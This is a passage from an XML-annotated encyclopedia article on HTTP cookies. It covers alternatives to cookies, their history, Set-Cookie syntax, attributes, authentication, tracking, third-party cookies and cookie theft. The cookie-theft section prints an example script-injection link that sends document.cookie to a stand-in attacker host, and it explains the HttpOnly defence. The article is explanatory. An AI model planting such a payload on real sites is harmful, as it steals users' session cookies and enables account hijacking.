Some major ISPs, including AOL, route all web traffic through a small number of proxies which makes this scheme particularly unworkable.</p>

</ss1>
<ss1>
<st>
URL (query string)</st>
<p>

A more precise technique is based on embedding information into URLs. The <link xlink:type="simple" xlink:href="../671/717671.xml">
query string</link> part of the <link xlink:type="simple" xlink:href="../277/32277.xml">
URL</link> is the one that is typically used for this purpose, but other parts can be used as well. The <message wordnetid="106598915" confidence="0.8">
<request wordnetid="106513366" confidence="0.8">
<link xlink:type="simple" xlink:href="../826/43826.xml">
Java Servlet</link></request>
</message>
 and <physical_entity wordnetid="100001930" confidence="0.8">
<communicator wordnetid="109610660" confidence="0.8">
<person wordnetid="100007846" confidence="0.8">
<compiler wordnetid="109946957" confidence="0.8">
<causal_agent wordnetid="100007347" confidence="0.8">
<language wordnetid="106282651" confidence="0.8">
<writer wordnetid="110794014" confidence="0.8">
<link xlink:type="simple" xlink:href="../131/24131.xml">
PHP</link></writer>
</language>
</causal_agent>
</compiler>
</person>
</communicator>
</physical_entity>
 session mechanisms both use this method if cookies are not enabled.</p>
<p>

This method consists of the Web server appending query strings to the links of a Web page it holds when sending it to a browser. When the user follows a link, the browser returns the attached query string to the server.</p>
<p>

Query strings used in this way and cookies are very similar, both being arbitrary pieces of information chosen by the server and sent back by the browser. However, there are some differences: since a query string is part of a URL, if that URL is later reused, the same attached piece of information is sent to the server. For example, if the preferences of a user are encoded in the query string of a URL and the user sends this URL to another user by <link xlink:type="simple" xlink:href="../738/9738.xml">
e-mail</link>, those preferences will be used for that other user as well.</p>
<p>

Moreover, even if the same user accesses the same page two times, there is no guarantee that the same query string is used in both views. For example, if the same user arrives to the same page but coming from a page internal to the site the first time and from an external <link xlink:type="simple" xlink:href="../023/4059023.xml">
search engine</link> the second time, the relative query strings are typically different while the cookies would be the same. For more details, see <link xlink:type="simple" xlink:href="../671/717671.xml">
query string</link>. </p>
<p>

Other drawbacks of query strings are related to security: storing data that identifies a session in a query string enables or simplifies <link xlink:type="simple" xlink:href="../708/3764708.xml">
session fixation</link> attacks, <link xlink:type="simple" xlink:href="../885/5258885.xml">
referer</link> logging attacks and other <accomplishment wordnetid="100035189" confidence="0.8">
<event wordnetid="100029378" confidence="0.8">
<action wordnetid="100037396" confidence="0.8">
<act wordnetid="100030358" confidence="0.8">
<psychological_feature wordnetid="100023100" confidence="0.8">
<feat wordnetid="100036762" confidence="0.8">
<link xlink:type="simple" xlink:href="../875/9875.xml">
security exploits</link></feat>
</psychological_feature>
</act>
</action>
</event>
</accomplishment>
. Transferring session identifiers as HTTP cookies is more secure.</p>

</ss1>
<ss1>
<st>
Hidden form fields</st>
<p>

A form of session tracking, used by <model wordnetid="105890249" confidence="0.8">
<idea wordnetid="105833840" confidence="0.8">
<concept wordnetid="105835747" confidence="0.8">
<artifact wordnetid="100021939" confidence="0.8">
<instrumentality wordnetid="103575240" confidence="0.8">
<engine wordnetid="103287733" confidence="0.8">
<motor wordnetid="103789946" confidence="0.8">
<device wordnetid="103183080" confidence="0.8">
<machine wordnetid="103699975" confidence="0.8">
<hypothesis wordnetid="105888929" confidence="0.8">
<link xlink:type="simple" xlink:href="../996/651996.xml">
ASP.NET</link></hypothesis>
</machine>
</device>
</motor>
</engine>
</instrumentality>
</artifact>
</concept>
</idea>
</model>
, is to use <link xlink:type="simple" xlink:href="../674/3422674.xml">
web forms</link> with hidden fields. This technique is very similar to using URL query strings to hold the information and has many of the same advantages and drawbacks; and if the form is handled with the <link xlink:type="simple" xlink:href="../104/2701104.xml">
HTTP</link> GET method, the fields actually become part of the URL the browser will send upon form submission.  But most forms are handled with HTTP POST, which causes the form information, including the hidden fields, to be appended as extra input that is neither part of the URL, nor of a cookie.</p>
<p>

This approach presents two advantages from the point of view of the tracker: first, having the tracking information placed in the HTML source and POST input rather than in the URL means it will not be noticed by the average user; second, the session information is not copied when the user copies the URL (to save the page on disk or send it via email, for example). A drawback of this technique is that session information is in the HTML code; therefore, each web page must be generated dynamically each time someone requests it, placing an additional workload on the web server.</p>

</ss1>
<ss1>
<st>
window.name</st>
<p>

All current web browsers can store a fairly large amount of data (2-32 MB) via JavaScript using the <link xlink:type="simple" xlink:href="../519/502519.xml">
DOM</link> property window.name. This data can be used instead of session cookies and is also cross domain. The technique can be coupled with <message wordnetid="106598915" confidence="0.8">
<information wordnetid="106634376" confidence="0.8">
<format wordnetid="106636806" confidence="0.8">
<link xlink:type="simple" xlink:href="../082/1575082.xml">
JSON</link></format>
</information>
</message>
/JavaScript objects to <weblink xlink:type="simple" xlink:href="http://www.thomasfrank.se/sessionvars.html">
store complex sets of session variables</weblink> on the client side.</p>
<p>

The downside is that every separate window or <link xlink:type="simple" xlink:href="../469/306469.xml">
tab</link> will initially have an empty <it>window.name</it>; in times of <link xlink:type="simple" xlink:href="../469/306469.xml">
tabbed browsing</link> this means that individually opened tabs <it>(initiation by user)</it> will not have a window name. Furthermore <it>window.name</it> can be used for tracking visitors across different web sites, making it of concern for <link xlink:type="simple" xlink:href="../060/1228060.xml">
Internet privacy</link>.</p>

</ss1>
<ss1>
<st>
HTTP authentication</st>
<p>

As for authentication, the HTTP protocol includes the <link xlink:type="simple" xlink:href="../512/1214512.xml">
basic access authentication</link> and the <link xlink:type="simple" xlink:href="../205/1381205.xml">
digest access authentication</link> protocols, which allow access to a Web page only when the user has provided the correct username and password. If the server requires such credential for granting access to a Web page, the browser requests them to the user; once obtained, the browser stores and uses them also for accessing subsequent pages, without requiring the user to provide them again. From the point of view of the user, the effect is the same as if cookies were used: username and password are only requested once, and from that point on the user is given access to the site. In the basic access authentication protocol, a combination of username and password is sent to the server in every browser request. This means that someone listening in on this traffic can simply read this information and store for later use. This problem is overcome in the digest access authentication protocol, in which the username and password are encrypted using a random <link xlink:type="simple" xlink:href="../390/6988390.xml">
nonce</link> created by the server.</p>

</ss1>
<ss1>
<st>
Macromedia Flash Local Stored Objects</st>
<p>

If a browser includes the <link xlink:type="simple" xlink:href="../947/20947.xml">
Macromedia Flash Player</link> <link xlink:type="simple" xlink:href="../659/23659.xml">
plugin</link>, the <link xlink:type="simple" xlink:href="../533/5959533.xml">
Local Shared Object</link>s functionality can be used in a way very similar to cookies. Local Stored Objects may be an attractive choice to web developers because a majority of <link xlink:type="simple" xlink:href="../890/18890.xml">
Windows</link> users have Flash Player installed, the default size limit is 100 kB, and the security controls are distinct from the user controls for cookies, so Local Shared Objects may be enabled when cookies are not.</p>
<p>

The major drawback with this approach is the same as every platform/vendor-specific approach: it breaks the web's global <link xlink:type="simple" xlink:href="../305/1192305.xml">
accessibility</link> and <link xlink:type="simple" xlink:href="../327/5848327.xml">
interoperability</link>, tying up web development to a specific client's platform, excluding users who use <link xlink:type="simple" xlink:href="../625/659625.xml">
standards-compliant</link> web <link xlink:type="simple" xlink:href="../303/487303.xml">
user agent</link>s and instead forcing them to use platform/vendor-specific web agents, which propitiates <link xlink:type="simple" xlink:href="../180/146180.xml">
vendor lock-in</link>.</p>

</ss1>
<ss1>
<st>
Client-side persistence</st>
<p>

Some web browsers support a script-based persistence mechanism that allows the page to store information locally for later retrieval. Internet Explorer, for example, supports persisting information in the browser's history, in favorites, in an XML store, or directly within a Web page saved to disk.<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%2223%22])">23</ref></p>
<p>

A different mechanism relies on browsers normally caching (holding in memory instead of reloading) JavaScript programs used in web pages. As an example, a page may contain a link such as &amp;lt;script type="text/javascript" src="example.js"&amp;gt;. The first time this page is loaded, the program example.js is loaded as well. At this point, the program remains cached and is not reloaded the second time the page is visited. As a result, if this program contains a statement such as id=3243242, this identifier remains valid and can be exploited by other JavaScript code the next times the page is loaded, or another page linking the same program is loaded.<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%2224%22])">24</ref></p>

</ss1>
</sec>
<sec>
<st>
History</st>
<p>

The term "HTTP cookie" derives from "<link xlink:type="simple" xlink:href="../333/425333.xml">
magic cookie</link>", a packet of data a program receives but only uses for sending it again, possibly to its origin, unchanged. Magic cookies were already used in computing when <link xlink:type="simple" xlink:href="../114/432114.xml">
Lou Montulli</link> had the idea of using them in Web communications in June 1994.<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%2225%22])">25</ref> At the time, he was an employee of <link xlink:type="simple" xlink:href="../979/21979.xml">
Netscape Communications</link>, which was developing an <link xlink:type="simple" xlink:href="../611/9611.xml">
e-commerce</link> application for a customer. Cookies provided a solution to the problem of reliably implementing a <link xlink:type="simple" xlink:href="../301/4431301.xml">
virtual shopping cart</link>.<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%221%22])">1</ref><ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%222%22])">2</ref></p>
<p>

Together with John Giannandrea, Montulli wrote the initial Netscape cookie specification the same year. Version 0.9beta of <software wordnetid="106566077" confidence="0.9508927676800064">
<link xlink:type="simple" xlink:href="../863/21863.xml">
Mosaic Netscape</link></software>
, released on October 13, 1994<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%2226%22])">26</ref><ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%2227%22])">27</ref>, supported cookies. The first actual use of cookies (out of the labs) was made for checking whether visitors to the Netscape Web site had already visited the site. Montulli applied for a patent for the cookie technology in 1995; it was granted in 1998. Support for cookies was integrated in Internet Explorer in version 2, released in October 1995.<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%2228%22])">28</ref></p>
<p>

The introduction of cookies was not widely known to the public, at the time. In particular, cookies were accepted by default, and users were not notified of the presence of cookies. Some people were aware of the existence of cookies as early as the first quarter of 1995,<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%2229%22])">29</ref> but the general public learned about them after the <it><newspaper wordnetid="106267145" confidence="0.9508927676800064">
<link xlink:type="simple" xlink:href="../566/136566.xml">
Financial Times</link></newspaper>
</it> published an article about them on February 12, 1996. In the same year, cookies received lot of media attention, especially because of potential privacy implications. Cookies were discussed in two <link xlink:type="simple" xlink:href="../750/3434750.xml">
U.S.</link> <agency wordnetid="108337324" confidence="0.9508927676800064">
<link xlink:type="simple" xlink:href="../215/182215.xml">
Federal Trade Commission</link></agency>
 hearings in 1996 and 1997.</p>
<p>

The development of the formal cookie specifications was already ongoing. In particular, the first discussions about a formal specification started in 
April 1995 on the <link>
www-talk</link> mailing list. A special working group within the <link xlink:type="simple" xlink:href="../285/15285.xml">
IETF</link> was formed. Two alternative proposals for introducing a state in an HTTP transactions had been proposed by Brian Behlendorf and David Kristol, respectively, but the group, headed by Kristol himself, soon decided to use the Netscape specification as a starting point. On February 1996, the working group identified third-party cookies as a considerable privacy threat. The specification produced by the group was eventually published as RFC 2109 in February 1997. It specifies that third-party cookies were either not allowed at all, or at least not enabled by default.</p>
<p>

At this time, advertising companies were already using third-party cookies. The recommendation about third-party cookies of RFC 2109 was not followed by Netscape and Internet Explorer. RFC 2109 was followed by RFC 2965 in October 2000.</p>

</sec>
<sec>
<st>
Implementation</st>

<ss1>
<st>
Setting a cookie</st>
<p>

Transfer of Web pages follows the <link xlink:type="simple" xlink:href="../443/13443.xml">
HyperText Transfer Protocol</link> (HTTP). Regardless of cookies, browsers request a page from web servers by sending them a short text called <link xlink:type="simple" xlink:href="../443/13443.xml">
HTTP request</link>. For example, to access the page http://www.example.org/index.html, browsers connect to the server www.example.org sending it a request that looks like the following one:</p>
<p>

<table>
<row>

<col>
GET /index.html HTTP/1.1
Host: www.example.org</col>

</row>
<row>
<col>
<b>browser</b></col>
<col>
→</col>
<col>
<b>server</b></col>
</row>
</table>
</p>
<p>

The server replies by sending the requested page preceded by a similar packet of text, called <link xlink:type="simple" xlink:href="../443/13443.xml">
'HTTP response'</link>. This packet may contain lines requesting the browser to store cookies:</p>
<p>

<table>
<row>

<col>
HTTP/1.1 200 OK
Content-type: text/html
Set-Cookie: name=value
&nbsp;
(content of page)</col>

</row>
<row>
<col>
<b>browser</b></col>
<col>
←</col>
<col>
<b>server</b></col>
</row>
</table>
</p>
<p>

The line Set-cookie is only sent if the server wishes the browser to store a cookie. Set-cookie is a request for the browser to store the string name=value and send it back in all future requests to the server. If the browser supports cookies and cookies are enabled, every subsequent page request to the same server contains the cookie. For example, the browser requests the page http://www.example.org/spec.html by sending the server www.example.org a request like the following:</p>
<p>

<table>
<row>

<col>
GET /spec.html HTTP/1.1
Host: www.example.org
Cookie: name=value
Accept: */*
&nbsp;</col>

</row>
<row>
<col>
<b>browser</b></col>
<col>
→</col>
<col>
<b>server</b></col>
</row>
</table>
</p>
<p>

This is a request for another page from the same server, and differs from the first one above because it contains the string that the server has previously sent to the browser. This way, the server knows that this request is related to the previous one. The server answers by sending the requested page, possibly adding other cookies as well.</p>
<p>

The value of a cookie can be modified by the server by sending a new Set-Cookie: name=newvalue line in response of a page request. The browser then replaces the old value with the new one.</p>
<p>

The term "cookie crumb" is sometimes used to refer to the name-value pair.<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%2230%22])">30</ref> This is not the same as <link xlink:type="simple" xlink:href="../176/2929176.xml">
breadcrumb web navigation</link>, which is the technique of showing in each page the list of pages the user has previously visited; this technique may however  be implemented using cookies.</p>
<p>

The Set-Cookie line is typically not created by the HTTP server itself but by a <link xlink:type="simple" xlink:href="../220/7220.xml">
CGI</link> program. The HTTP server only sends the result of the program (a document preceded by the header containing the cookies) to the browser.</p>
<p>

Cookies can also be set by JavaScript or similar scripts running within the browser. In JavaScript, the object document.cookie is used for this purpose. For example, the instruction document.cookie = "temperature=20" creates a cookie of name temperature and value 20.<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%2231%22])">31</ref></p>

</ss1>
<ss1>
<st>
Cookie attributes</st>
<p>

Beside the name/value pair, a cookie may also contain an expiration date, a <system wordnetid="104377057" confidence="0.8">
<artifact wordnetid="100021939" confidence="0.8">
<instrumentality wordnetid="103575240" confidence="0.8">
<link xlink:type="simple" xlink:href="../357/403357.xml">
path</link></instrumentality>
</artifact>
</system>
, a <link xlink:type="simple" xlink:href="../878/39878.xml">
domain name</link>, and whether the cookie is intended only for <message wordnetid="106598915" confidence="0.8">
<protocol wordnetid="106665108" confidence="0.8">
<standard wordnetid="107260623" confidence="0.8">
<direction wordnetid="106786629" confidence="0.8">
<rule wordnetid="106652242" confidence="0.8">
<system_of_measurement wordnetid="113577171" confidence="0.8">
<link xlink:type="simple" xlink:href="../813/187813.xml">
encrypted connection</link></system_of_measurement>
</rule>
</direction>
</standard>
</protocol>
</message>
s. RFC 2965 also specifies that cookies must have a mandatory version number, but this is usually omitted. These pieces of data follow the name=newvalue pair and are separated by semicolons. For example, a cookie can be created by the server by sending a line Set-Cookie: name=newvalue; expires=date; path=/; domain=.example.org.</p>
<p>

<image location="right" width="200px" src="HTTP-Cookie-Google.png" type="thumb">
<caption>

Example of an HTTP response from <company wordnetid="108058098" confidence="0.9508927676800064">
<link xlink:type="simple" xlink:href="../923/1092923.xml">
google.com</link></company>
, which sets a cookie with attributes.
</caption>
</image>

The domain and path tell the browser that the cookie has to be sent back to the server when requesting URLs of a given domain and path. If not specified, they default to the domain and path of the object that was requested. As a result, the domain and path strings may tell the browser to send the cookie when it normally would not. For security reasons, the cookie is accepted only if the server is a member of the domain specified by the domain string. </p>
<p>

Cookies are actually identified by the triple name/domain/path, not only the name (the original Netscape specification considers only the pair name/path). In other words, same name but different domains or paths identify different cookies with possibly different values. As a result, cookie values are changed only if a new value is given for the same name, domain, and path.</p>
<p>

The expiration date tells the browser when to delete the cookie. If no expiration date is provided, the cookie is deleted at the end of the user session, that is, when the user quits the browser. As a result, specifying an expiration date is a means for making cookies to survive across browser sessions. For this reason, cookies that have an expiration date are called <it>persistent</it>.</p>
<p>

The expiration date is specified in the "Wdy, DD-Mon-YYYY HH:MM:SS <link xlink:type="simple" xlink:href="../701/12701.xml">
GMT</link>" format. As an example, the following is a cookie sent by a Web server (the value string has been changed):</p>
<p>

Set-Cookie: RMID=732423sdfs73242; expires=Fri, 31-Dec-2010 23:59:59 GMT; path=/; domain=.example.net</p>
<p>

The name of this particular cookie is RMID, while its value is the string 732423sdfs73242. The server can use an arbitrary string as the value of a cookie. The server may collapse the value of a number of variables in a single string, like for example a=12&amp;b=abcd&amp;c=32. The path and domain strings / and .example.net tell the browser to send the cookie when requesting an arbitrary page of the domain .example.net, with an arbitrary path.</p>

</ss1>
<ss1>
<st>
Expiration</st>
<p>

Cookies expire, and are therefore not sent by the browser to the server, under any of these conditions:</p>
<p>

<list>
<entry level="1" type="number">

 At the end of the user session (i.e. when the browser is shut down) if the cookie is not persistent</entry>
<entry level="1" type="number">

 An expiration date has been specified, and has passed</entry>
<entry level="1" type="number">

 The expiration date of the cookie is changed (by the server or the script) to a date in the past</entry>
<entry level="1" type="number">

 The browser deletes the cookie by user request</entry>
</list>
</p>
<p>

The third condition allows a server or script to explicitly delete a cookie. Note that the browser doesn't send to the server information about cookie lifetime, so there is no way for the server to check if the cookie expires soon.</p>

</ss1>
<ss1>
<st>
Authentication</st>
<p>

Cookies can be used by a server to recognize previously-<link xlink:type="simple" xlink:href="../967/47967.xml">
authenticate</link>d users and to personalize the web pages of a site depending on the preferences of a user. This can be done for example as follows:</p>
<p>

<list>
<entry level="1" type="number">

 The user inserts username and password in the text fields of a login page and sends them to the server;</entry>
<entry level="1" type="number">

 The server receives username and password and checks them; if correct, it sends back a page confirming that login has been successful together with a cookie containing a random session ID that coincides with a session stored in a database.  This cookie is usually made valid for only the current browser session, however it may also be set to expire at a future date. The random session ID is then provided on future visits and provides a way for the server to uniquely identify the browser and that the browser already has an authenticated user.</entry>
<entry level="1" type="number">

 Every time the user requests a page from the server, the browser automatically sends the cookie back to the server; the server compares the cookie with the stored ones; if a match is found, the server knows which user has requested that page.</entry>
</list>
</p>
<p>

This is the method commonly used by many sites that allow logging in, such as <company wordnetid="108058098" confidence="0.9508927676800064">
<link xlink:type="simple" xlink:href="../213/188213.xml">
Yahoo!</link></company>
, <web_site wordnetid="106359193" confidence="0.9508927676800064">
<link xlink:type="simple" xlink:href="../734/5043734.xml">
Wikipedia</link></web_site>
, and <company wordnetid="108058098" confidence="0.9508927676800064">
<link xlink:type="simple" xlink:href="../378/7529378.xml">
Facebook</link></company>
.  (See "Cookie Theft" and "Cookie Expiration" sections of this article for security concerns around this mechanism)</p>

</ss1>
</sec>
<sec>
<st>
Personalization</st>
<p>

Cookies can be used for allowing users to express preferences about a Web site. For example, the <company wordnetid="108058098" confidence="0.9508927676800064">
<link xlink:type="simple" xlink:href="../923/1092923.xml">
Google</link></company>
 search engine allows the user to choose how many results are to be shown for every query, and this choice is maintained across sessions.</p>
<p>

If a user was authenticated using the technique above, when they request a page the server is also sent the cookie associated with the user. It can therefore adapt the requested page to the stored user preferences. When authentication is not used, the user preferences are stored in a cookie. Users select their preferences by entering them in a Web form and submitting it to the server. The server encodes them in a cookie and sends it back to the browser.  This way, every time the user accesses a page, the server is also sent the cookie where the preferences are stored, and can personalise the page according to the user preferences.</p>
<p>

For example, Google stores the user preferences in a cookie of name PREF. This cookie is created with default values when the user accesses the site for the first time. For example, the cookie value contains the string NR=10, that indicates a default preference of ten hits displayed in each page. If the user changes this number to 20 in the preference page, the server modifies the cookie with NR=20. Every time the user queries the search engine, the cookie is sent to the server along with the query. This way, the server knows how many hits should be shown in each page.</p>

<ss1>
<st>
Tracking</st>
<p>

Cookies can also be used for tracking the path of a user while visiting the web pages of a site. This can also be done in part by using the <link xlink:type="simple" xlink:href="../921/14921.xml">
IP address</link> of the computer requesting the page or the <link xlink:type="simple" xlink:href="../885/5258885.xml">
referer</link> field of the <link xlink:type="simple" xlink:href="../443/13443.xml">
HTTP header</link>, but cookies allows for a greater precision. This can be done for example as follows:</p>
<p>

<list>
<entry level="1" type="number">

 If the user requests a page of the site, but the request contains no cookie, the server presumes that this is the first page visited by the user; the server creates a random string and sends it as a cookie back to the browser together with the requested page;</entry>
<entry level="1" type="number">

 From this point on, the cookie will be automatically sent by the browser to the server every time a new page from the site is requested; the server sends the page as usual, but also stores the URL of the requested page along with the date/time and the cookie in a log file.</entry>
</list>
</p>
<p>

By looking at the log file, it is then possible to find out which pages, and in which sequence, the user has visited. For example, if the log contains some requests done using the cookie id=dfhsiw, these requests all come from the same user. The URL and time/date stored with the cookie allows finding out which pages the user has visited, and at which time.</p>

</ss1>
<ss1>
<st>
Third-party cookies</st>
<p>

Images or other objects contained in a Web page may reside in servers different from the one holding the page. In order to show such a page, the browser downloads all these objects, possibly receiving cookies. These cookies are called <it>third-party cookies</it> if the server sending them is located outside the domain of the Web page.</p>
<p>

This condition is common with on-line advertisement. Indeed, <link xlink:type="simple" xlink:href="../044/34044.xml">
web banner</link>s are typically stored in servers of the advertising company, which are not in the domain of the Web pages showing them. If third-party cookies are not rejected by the browser, an advertising company can track a user across the sites where it has placed a banner. In particular, whenever a user views a page containing a banner, the browser retrieves the banner from a server of the advertising company. If this server has previously set a cookie, the browser sends it back, allowing the advertising company to link this access with the previous one. By choosing a unique banner URL for every Web page where it is placed or by using the HTTP <link xlink:type="simple" xlink:href="../885/5258885.xml">
referer</link> field, the advertising company can then find out which pages the user has viewed. The same technique can be used with <link xlink:type="simple" xlink:href="../430/1157430.xml">
web bug</link>s. These, unlike the obvious banners, are images embedded in the Web page that are undetectable by the user (e.g. they are tiny and/or transparent)</p>
<p>

Third-party cookies are used to create an anonymous profile of the user. This allows the advertising company to select the banner to show to a user based on the user's profile. The advertising industry has denied any other use of these profiles.</p>
<p>

Many modern browsers, such as <software wordnetid="106566077" confidence="0.8">
<application wordnetid="106570110" confidence="0.8">
<program wordnetid="106568978" confidence="0.8">
<browser wordnetid="106571301" confidence="0.8">
<written_communication wordnetid="106349220" confidence="0.8">
<writing wordnetid="106359877" confidence="0.8">
<code wordnetid="106355894" confidence="0.8">
<coding_system wordnetid="106353757" confidence="0.8">
<link xlink:type="simple" xlink:href="../892/210892.xml">
Mozilla Firefox</link></coding_system>
</code>
</writing>
</written_communication>
</browser>
</program>
</application>
</software>
, <software wordnetid="106566077" confidence="0.9508927676800064">
<link xlink:type="simple" xlink:href="../215/15215.xml">
Internet Explorer</link></software>
 and <software wordnetid="106566077" confidence="0.9508927676800064">
<link xlink:type="simple" xlink:href="../620/18996620.xml">
Opera</link></software>
 block third party cookies if requested by the user. Internet Explorer version 6 allows a mild form of blocking, called <it>leashing</it>. A leashed cookie is a third-party cookie that is sent by the browser only when accessing a third-party document via the same first-party. For example, if third.com sets a cookie when an image is requested, and this cookie is set for the first time when the user views a document from first.com, the same cookie is not sent if the user downloads a document that contains the same image but the document is on another site other.com, if the cookie is leashed. A leashed cookie is different from a blocked cookie in that it is sent, in this example, if the image is contained in another document from the same site first.com.<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%2232%22])">32</ref></p>

</ss1>
<ss1>
<st>
Basket</st>
<p>

Some online shopping sites allow a user, even when not logged in, to store a number of items in a "virtual basket". The user starts navigating the site with an empty basket, and can add items to the basket while visiting the site. The list of items the user has chosen can be stored using cookies. For example, the server sends an empty cookie to the browser when the user visits the first page; whenever the user adds an item to the basket, the server adds the name of the item to the cookie.</p>
<p>

This is a very insecure mechanism, because a malicious user can alter the cookie; a much more secure mechanism is to generate a random cookie as under "tracking", and using that as a lookup key in a database stored on the server.</p>

</ss1>
<ss1>
<st>
Cookie theft</st>
<p>

The cookie specifications constrain cookies to be sent back only to the servers in the same domain as the server from which they originate. However, the value of cookies can be sent to other servers using means different from the Cookie header.</p>
<p>

In particular, scripting languages such as <programming_language wordnetid="106898352" confidence="0.9508927676800064">
<link xlink:type="simple" xlink:href="../845/9845.xml">
JavaScript</link></programming_language>
 and <programming_language wordnetid="106898352" confidence="0.9508927676800064">
<link xlink:type="simple" xlink:href="../872/263872.xml">
JScript</link></programming_language>
 are usually allowed access to cookie values and have some means to send arbitrary values to arbitrary servers on the Internet. These facts are used in combination with sites allowing users to post HTML content that other users can see.</p>
<p>

As an example, an attacker running the domain example.com may post a comment containing the following link to a popular blog they do not otherwise control:</p>
<p>

<indent level="1">

&amp;lt;a href="#" onclick="window.location='http://example.com/stole.cgi?text='+escape(document.cookie); return false;"&amp;gt;Click here!&amp;lt;/a&amp;gt;
</indent>

When another user clicks on this link, the browser executes the piece of code within the onclick attribute, thus replacing the string document.cookie with the list of cookies of the user that are active for the page. As a result, this list of cookies is sent to the example.com server, and the attacker is then able to collect the cookies of other users.</p>
<p>

This type of attack is difficult to detect on the user side because the script is coming from the same domain that has set the cookie, and the operation of sending the value appears to be authorised by this domain. It is usually considered the responsibility of the administrators running sites where users can post to disallow the posting of such malicious code.</p>
<p>

Cookies are not directly visible to client-side programs such as JavaScript if they have been sent with the HttpOnly flag. From the point of view of the server, the only difference with respect of the normal case is that the set-cookie header line is added a new field containing the string `HttpOnly':</p>
<p>

<indent level="1">

Set-Cookie: RMID=732423sdfs73242; expires=Fri, 31-Dec-2010 23:59:59 GMT; path=/; domain=.example.net; HttpOnly
</indent>

When the browser receives such a cookie, it is supposed to use it as usual in the following HTTP exchanges, but not to make it visible to client-side scripts.<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%2233%22])">33</ref>  The `HttpOnly` flag is not part of any standard, and is not implemented in all browsers. Note that there is currently no prevention of reading or writing the session cookie via a XMLHTTPRequest. <ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%2234%22])">34</ref>.</p>

</ss1>
</sec>
<sec>
<st>
References</st>

<p>

<reflist>
<entry id="1">
Jay Kesan and Rajiv Shah. <weblink xlink:type="simple" xlink:href="http://papers.ssrn.com/sol3/papers.cfm?abstract_id=597543">
Deconstructing Code</weblink>. Chapter II.B (Netscape's cookies). Yale Journal of Law and Technology, 6, 277–389.</entry>
<entry id="2">
David Kristol. HTTP Cookies: Standards, privacy, and politics. ACM Transactions on Internet Technology, 1(2), 151–198, 2001. <document wordnetid="106470073" confidence="0.8">
<written_communication wordnetid="106349220" confidence="0.8">
<writing wordnetid="106362953" confidence="0.8">
<link xlink:type="simple" xlink:href="../994/422994.xml">
doi</link></writing>
</written_communication>
</document>
:<weblink xlink:type="simple" xlink:href="http://dx.doi.org/10.1145%2F502152.502153">
10.1145/502152.502153</weblink></entry>
<entry id="3">
<weblink xlink:type="simple" xlink:href="http://wp.netscape.com/newsref/std/cookie_spec.html">
Persistent client state - HTTP cookies - Preliminary specification (307 to netscape.aol.com)</weblink> (Netscape)</entry>
<entry id="4">
RFC 2109 and RFC 2965 - HTTP State Management Mechanism (<link xlink:type="simple" xlink:href="../285/15285.xml">
IETF</link>)</entry>
<entry id="5">
<weblink xlink:type="simple" xlink:href="http://www.theallineed.com/computers/05072901.htm">
Contrary to popular belief, cookies are good for you! (on the Internet)</weblink></entry>
<entry id="6">
Keith C. Ivey <weblink xlink:type="simple" xlink:href="http://www.eeicommunications.com/eye/utw/98feb.html">
Untangling the Web Cookies: Just a Little Data Snack</weblink>. 1998</entry>
<entry id="7">
"<weblink xlink:type="simple" xlink:href="http://www.ciac.org/ciac/bulletins/i-034.shtml">
I-034: Internet Cookies</weblink>".&#32;  CIAC, United States Department of Energy (ciac.org)&#32;(March 12, 1998, revised February 1, 2007).&#32;Retrieved on <link>
2007-11-05</link>.</entry>
<entry id="8">
Brian Quinton. <weblink xlink:type="simple" xlink:href="http://searchlineinfo.com/InsightExpress_cookie_study/">
Study: Users Don't Understand, Can’t Delete Cookies</weblink>. Direct. May 18, 2005</entry>
<entry id="9">
Adam Penenberg. <weblink xlink:type="simple" xlink:href="http://www.slate.com/id/2129656/">
Cookie Monsters</weblink>. <web_site wordnetid="106359193" confidence="0.9508927676800064">
<link xlink:type="simple" xlink:href="../731/423731.xml">
Slate</link></web_site>
, November 7, 2005</entry>
<entry id="10">
<weblink xlink:type="simple" xlink:href="http://www.cookiecentral.com/faq/">
The unofficial cookie faq</weblink></entry>
<entry id="11">
CBS News. <weblink xlink:type="simple" xlink:href="http://www.cbsnews.com/stories/2002/03/20/tech/main504131.shtml">
CIA Caught Sneaking Cookies</weblink>. March 20, 2002.</entry>
<entry id="12">
The Associated Press. <weblink xlink:type="simple" xlink:href="http://www.nytimes.com/2005/12/29/national/29cookies.html">
Spy Agency Removes Illegal Tracking Files</weblink>. December 29, 2005</entry>
<entry id="13">
"<weblink xlink:type="simple" xlink:href="http://operawiki.info/NewCookieSettings">
Cookie Settings for Opera 9</weblink>".&#32;  OperaWiki.info.&#32;Retrieved on <link>
2008-01-20</link>.</entry>
<entry id="14">
The Washington Post. <weblink xlink:type="simple" xlink:href="http://www.washingtonpost.com/wp-dyn/content/article/2005/07/16/AR2005071600111.html">
How to Block Tracking Cookies</weblink>. July 17, 2005. Retrieved on 2008-08-31.</entry>
<entry id="15">
"<weblink xlink:type="simple" xlink:href="http://www.w3.org/Protocols/rfc2109/rfc2109">
HTTP State Management</weblink>".</entry>
<entry id="17">
<weblink xlink:type="simple" xlink:href="http://www.cgisecurity.com/articles/xss-faq.shtml#theft">
"Can you show me what XSS cookie theft looks like?"</weblink> (except from the Cgisecurity <weblink xlink:type="simple" xlink:href="http://www.cgisecurity.com/articles/xss-faq.shtml">
Cross-Site Scripting FAQ</weblink>)</entry>
<entry id="16">
"<weblink xlink:type="simple" xlink:href="http://news.bbc.co.uk/2/hi/technology/6929258.stm">
Warning of webmail wi-fi hijack</weblink>".&#32;  <statement wordnetid="106722453" confidence="0.8">
<message wordnetid="106598915" confidence="0.8">
<announcement wordnetid="106746580" confidence="0.8">
<program wordnetid="106748466" confidence="0.8">
<link xlink:type="simple" xlink:href="../893/1139893.xml">
BBC News</link></program>
</announcement>
</message>
</statement>
&#32;(August 3, 2007).</entry>
<entry id="19">
